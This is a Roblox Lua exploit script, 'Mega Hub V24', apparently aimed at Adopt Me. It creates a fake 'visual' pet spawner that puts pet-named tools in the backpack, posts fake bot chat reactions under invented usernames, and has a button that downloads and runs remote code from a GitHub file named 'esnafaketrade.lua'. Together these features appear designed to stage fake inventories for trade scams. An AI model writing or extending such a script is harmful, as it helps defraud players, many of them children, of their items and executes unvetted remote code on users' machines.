-- [[ MEGA HUB V24: SIDEBAR SPACING FIX ]] --
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

if CoreGui:FindFirstChild("MegaHubV24") then CoreGui.MegaHubV24:Destroy() end
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV24"

-- --- BOT REACTION SYSTEM ---
local BotNames = {"SurenArmen", "Aura_Dev", "Gus_Leaker", "AdoptMeFan"}
local function BotReact(emoji)
    local randomBot = BotNames[math.random(1, #BotNames)]
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Bot] " .. randomBot .. " reacted: " .. emoji;
        Color = Color3.fromRGB(255, 255, 255);
        Font = Enum.Font.GothamBold;
    })
end

-- --- SEPARATE SPAWNER WINDOW ---
local SpawnerWin = Instance.new("Frame", ScreenGui)
SpawnerWin.Size = UDim2.new(0, 380, 0, 340)
SpawnerWin.Position = UDim2.new(0.6, 0, 0.3, 0)
SpawnerWin.BackgroundColor3 = Color3.fromRGB(35, 38, 47)
SpawnerWin.BorderSizePixel = 2 SpawnerWin.BorderColor3 = Color3.fromRGB(0, 255, 200)
SpawnerWin.Visible = false SpawnerWin.Active = true SpawnerWin.Draggable = true
Instance.new("UICorner", SpawnerWin)

local SHead = Instance.new("TextLabel", SpawnerWin)
SHead.Size = UDim2.new(1, 0, 0, 35) SHead.Text = "Pets  Jaradz Library  Toys"
SHead.TextColor3 = Color3.new(1,1,1) SHead.BackgroundTransparency = 1

local SInput = Instance.new("TextBox", SpawnerWin)
SInput.Size = UDim2.new(0.9, 0, 0, 40) SInput.Position = UDim2.new(0.05, 0, 0.15, 0)
SInput.PlaceholderText = "Enter Pet Name to Spawn" SInput.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
SInput.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SInput)

local StatusText = Instance.new("TextLabel", SpawnerWin)
StatusText.Size = UDim2.new(1, 0, 0, 20) StatusText.Position = UDim2.new(0, 0, 0.92, 0)
StatusText.Text = "Mode: Normal" StatusText.TextColor3 = Color3.new(0.7, 0.7, 0.7)
StatusText.BackgroundTransparency = 1 StatusText.TextSize = 12

-- --- TOGGLE LOGIC ---
local Selected = {F = false, R = false, N = false, M = false}
local Btns = {}
local function UpdateVisuals()
    local prefix = ""
    if Selected.M then prefix = "M" elseif Selected.N then prefix = "N" end
    if Selected.F then prefix = prefix .. "F" end
    if Selected.R then prefix = prefix .. "R" end
    StatusText.Text = "Mode: " .. (prefix == "" and "Normal" or prefix)
    for txt, btn in pairs(Btns) do
        btn.BackgroundColor3 = Selected[txt] and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(30, 30, 30)
    end
    return prefix
end

local frnm = Instance.new("Frame", SpawnerWin)
frnm.Size = UDim2.new(0, 340, 0, 40) frnm.Position = UDim2.new(0.05, 0, 0.35, 0) frnm.BackgroundTransparency = 1
Instance.new("UIListLayout", frnm).FillDirection = "Horizontal"

local function CreateToggle(t, c)
    local b = Instance.new("TextButton", frnm)
    b.Size = UDim2.new(0.25, -5, 1, 0) b.Text = t b.TextColor3 = Color3.new(1,1,1)
    b.BackgroundColor3 = Color3.fromRGB(30, 30, 30) b.BorderColor3 = c b.BorderSizePixel = 2
    Btns[t] = b
    b.MouseButton1Click:Connect(function()
        Selected[t] = not Selected[t]
        if t == "M" and Selected.M then Selected.N = false end
        if t == "N" and Selected.N then Selected.M = false end
        UpdateVisuals()
    end)
end
CreateToggle("F", Color3.new(0, 0.6, 1)) CreateToggle("R", Color3.new(1, 0, 0.6)) 
CreateToggle("N", Color3.new(0, 1, 0.4)) CreateToggle("M", Color3.new(0.6, 1, 0))

local SpawnBtn = Instance.new("TextButton", SpawnerWin)
SpawnBtn.Size = UDim2.new(0.9, 0, 0, 40) SpawnBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
SpawnBtn.Text = "Spawn Pet (Visual)" SpawnBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200) SpawnBtn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", SpawnBtn)
SpawnBtn.MouseButton1Click:Connect(function()
    local mode = UpdateVisuals()
    local name = (mode == "" and "" or mode.." ") .. SInput.Text
    local fake = Instance.new("Tool", LP.Backpack) fake.Name = name
    StatusText.Text = "Spawned: " .. name
end)

-- --- MAIN HUB (FIXED SIDEBAR) ---
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 520, 0, 380) Main.Position = UDim2.new(0.5, -260, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25) Main.Draggable = true Main.Active = true
Instance.new("UICorner", Main)

local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 150, 1, -40) Side.Position = UDim2.new(0, 0, 0, 40)
Side.BackgroundColor3 = Color3.fromRGB(20, 20, 20) Instance.new("UICorner", Side)

-- FIXED LIST LAYOUT FOR SIDEBAR
local SideLayout = Instance.new("UIListLayout", Side)
SideLayout.Padding = UDim.new(0, 5) -- Stops buttons from merging
SideLayout.SortOrder = Enum.SortOrder.LayoutOrder

local Content = Instance.new("ScrollingFrame", Main)
Content.Size = UDim2.new(1, -170, 1, -60) Content.Position = UDim2.new(0, 160, 0, 50)
Content.BackgroundTransparency = 1 Instance.new("UIListLayout", Content).Padding = UDim.new(0,10)

local function Nav(txt, order, func)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(1, 0, 0, 50) b.Text = "  " .. txt
    b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
    b.TextXAlignment = Enum.TextXAlignment.Left b.LayoutOrder = order
    b.MouseButton1Click:Connect(func)
end

Nav("🐾 Adopt Me", 1, function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)
Nav("⚙️ Misc", 2, function() 
    for _,v in pairs(Content:GetChildren()) do if not v:IsA("UIListLayout") then v:Destroy() end end
    local b = Instance.new("TextButton", Content)
    b.Size = UDim2.new(0.95, 0, 0, 50) b.Text = "Execute Spawner" b.BackgroundColor3 = Color3.fromRGB(50,50,50)
    b.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function() SpawnerWin.Visible = not SpawnerWin.Visible end)
end)

-- --- EMOJI BAR ---
local EBar = Instance.new("Frame", ScreenGui)
EBar.Size = UDim2.new(0, 340, 0, 45) EBar.Position = UDim2.new(0.5, -170, 0.85, 0)
EBar.BackgroundColor3 = Color3.new(1,1,1) Instance.new("UICorner", EBar) EBar.Draggable = true
local eL = Instance.new("UIListLayout", EBar) eL.FillDirection = "Horizontal" eL.HorizontalAlignment = "Center" eL.VerticalAlignment = "Center" eL.Padding = UDim.new(0, 12)
for _, e in pairs({"👍", "😲", "💯", "👀", "🔥", "❤️", "🎉"}) do
    local b = Instance.new("TextButton", EBar)
    b.Size = UDim2.new(0, 32, 0, 32) b.Text = e b.TextSize = 25 b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(function() BotReact(e) end)
end
